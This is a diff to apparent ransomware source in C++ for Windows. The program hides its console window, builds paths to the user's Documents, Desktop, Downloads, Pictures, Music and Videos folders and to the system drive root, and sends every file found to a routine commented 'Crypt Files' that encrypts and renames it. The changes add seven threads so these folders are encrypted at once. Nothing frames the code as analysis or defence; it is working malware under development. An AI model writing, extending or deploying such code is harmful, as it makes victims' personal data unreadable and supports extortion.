@@ -7,6 +7,7 @@
 #include <experimental/filesystem>
 #include <sstream>
 #include <tchar.h>
+#include <TlHelp32.h>
 
 using namespace std;
 
@@ -18,6 +19,10 @@ TCHAR  infoBuf[INFO_BUFFER_SIZE];
 DWORD  bufCharCount = INFO_BUFFER_SIZE;
 
 int i = 0;
+
+int threads = 0;
+
+string paths[MAX_PATH];
 
 void rename_file(string file)
 {
@@ -38,9 +43,10 @@ void 他媽的計算機(string file) // Crypt Files
     rename_file(file);
 }
 
-void 列表文件(string path) // Get Files
+void 列表文件() // Get Files
 {
-    for (auto const& p : fs::recursive_directory_iterator(path))
+    // cout << paths[threads++] << endl;
+    for (auto const& p : fs::recursive_directory_iterator(paths[threads++]))
     {
         if (!fs::is_directory(p)) {
             他媽的計算機(p.path().string());
@@ -50,6 +56,7 @@ void 列表文件(string path) // Get Files
 
 int main()
 {
+    int j = 0;
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     char* DriveSystem = getenv("SystemDrive");
 
@@ -61,7 +68,7 @@ int main()
     stringstream Music;
     stringstream HD_;
 
-    GetUserName(infoBuf, &bufCharCount);
+    GetUserNameA(infoBuf, &bufCharCount);
 
     documents << DriveSystem << "\\" << "Users\\" << infoBuf << "\\Documents";
     Desktop << DriveSystem << "\\" << "Users\\" << infoBuf << "\\Desktop";
@@ -71,13 +78,21 @@ int main()
     Music << DriveSystem << "\\" << "Users\\" << infoBuf << "\\Music";
     HD_ << DriveSystem << "\\";
 
-    列表文件(documents.str());
-    列表文件(Desktop.str());
-    列表文件(Downloads.str());
-    列表文件(Videos.str());
-    列表文件(Pictures.str());
-    列表文件(Music.str());
-    列表文件(HD_.str());
+    paths[j++] = documents.str();
+    paths[j++] = Desktop.str();
+    paths[j++] = Downloads.str();
+    paths[j++] = Videos.str();
+    paths[j++] = Pictures.str();
+    paths[j++] = Music.str();
+    paths[j++] = HD_.str();
+    
+    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);
+    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);
+    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);
+    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);
+    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);
+    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);
+    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);
 
     return 0;
 }
